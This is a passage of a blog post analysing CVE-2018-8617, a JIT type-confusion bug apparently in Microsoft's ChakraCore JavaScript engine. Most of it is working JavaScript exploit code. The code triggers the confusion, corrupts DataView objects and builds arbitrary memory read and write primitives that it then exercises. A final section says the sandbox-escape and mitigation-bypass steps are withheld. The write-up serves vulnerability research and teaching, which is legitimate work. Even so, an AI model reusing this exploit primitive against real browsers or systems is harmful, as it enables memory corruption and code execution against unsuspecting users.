</span></span><span class="line"><span class="cl">    <span class="nx">yesy</span> <span class="o">=</span> <span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;HM&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">dynamicDataViewObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">3158</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtableAddr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">found</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">addrOffset</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">addrOffset</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">addrOffset</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">vtableAddr</span> <span class="o">==</span> <span class="nx">uniqueSize</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sizeOffset</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">found</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtableAddr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">vtableAddr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">readPtr</span><span class="p">(</span><span class="nx">vtableAddr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;LEAK: &#34;</span> <span class="o">+</span> <span class="nx">a</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Attach WinDbg now...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">();</span>
</span></span></code></pre></div><p>With that proven&hellip; which I was stuck on for HOURS. We can finish up the primitive :)</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="alt text" src="/CVE-2018-8617-Analysis/poc.png">

  
</figure>
</p>
<p>Exploit code can be seen below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">addrOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">sizeOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">customDataViewObj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dynamicDataViewObj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger_type_confusion</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">createDataViewObject</span><span class="p">(</span><span class="nx">customLength</span><span class="p">,</span> <span class="nx">newBuffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">dvObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">leak_obj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span><span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">dvObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">dvVfptrHeader</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dvType</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">targetObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">42</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">42</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">ptrObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">ptrObj</span><span class="p">,</span> <span class="nx">ptrObj</span><span class="p">,</span> <span class="nx">targetObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ptrObj</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">dvVfptrHeader</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ptrObj</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">dvType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="nx">b</span><span class="o">:</span><span class="mi">1</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">writer</span><span class="p">,</span> <span class="nx">writer</span><span class="p">,</span> <span class="nx">ptrObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">customLength</span><span class="p">;</span>      
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">newBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">targetObj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">SignedDwordToUnsignedDword</span><span class="p">(</span><span class="nx">sd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nx">sd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="nx">sd</span> <span class="o">+</span> <span class="mh">0x100000000</span> <span class="o">:</span> <span class="nx">sd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">writePtr</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="p">,</span> <span class="nx">addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">ptr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="nx">ptr</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">writeDword</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">dword</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="nx">addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mh">0x3C</span><span class="p">,</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">dword</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">readPtr</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="p">,</span> <span class="nx">addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">SignedDwordToUnsignedDword</span><span class="p">(</span><span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">getInt32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">value</span> <span class="o">+=</span> <span class="nx">SignedDwordToUnsignedDword</span><span class="p">(</span><span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">getInt32</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">readDword</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="p">,</span> <span class="nx">addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">SignedDwordToUnsignedDword</span><span class="p">(</span><span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">getInt32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">trigger_type_confusion</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">arrBuff</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span> <span class="o">=</span> <span class="nx">createDataViewObject</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="nx">arrBuff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">uniqueSize</span> <span class="o">=</span> <span class="mh">0x133700</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">arrControlBuff</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">uniqueSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">localDataView</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">uniqueSize</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dynamicDataViewObj</span> <span class="o">=</span> <span class="nx">localDataView</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">3158</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtableAddr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">found</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">addrOffset</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">addrOffset</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">addrOffset</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">vtableAddr</span> <span class="o">==</span> <span class="nx">uniqueSize</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sizeOffset</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">found</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">8</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtableAddr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Reading from 0x&#34;</span> <span class="o">+</span> <span class="nx">vtableAddr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">readPtr</span><span class="p">(</span><span class="nx">vtableAddr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Read data: 0x&#34;</span> <span class="o">+</span> <span class="nx">a</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] read DWORD: 0x&#34;</span> <span class="o">+</span> <span class="nx">readDword</span><span class="p">(</span><span class="nx">vtableAddr</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">writeDword</span><span class="p">(</span><span class="nx">vtableAddr</span><span class="p">,</span> <span class="mh">0x414141</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[+] Wrote DWORD&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">writePtr</span><span class="p">(</span><span class="nx">vtableAddr</span><span class="p">,</span> <span class="mh">0x424242424242</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[+] Wrote PTR&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] PoC Done&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Attach WinDbg now...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">();</span>
</span></span></code></pre></div>
<h1 class="relative group">Weaponization 
    <div id="weaponization" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#weaponization" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>With the read/write primitive complete all I needed to do was simply implement techniques developed during the AWE to bypass modern memory protections and perform the sandbox escape. To preserve the course contents, I will not be sharing them :P</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="alt text" src="/CVE-2018-8617-Analysis/exploit.gif">

  
</figure>
</p>

          
          
          
        </div>
        
        

        

        

      </div>

      
      
        
        
          
          
        
        
        
        <script
          type="text/javascript"
          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
          data-oid="views_posts/CVE-2018-8617-Analysis/index.md"
          data-oid-likes="likes_posts/CVE-2018-8617-Analysis/index.md"></script>
      
    </section>

    
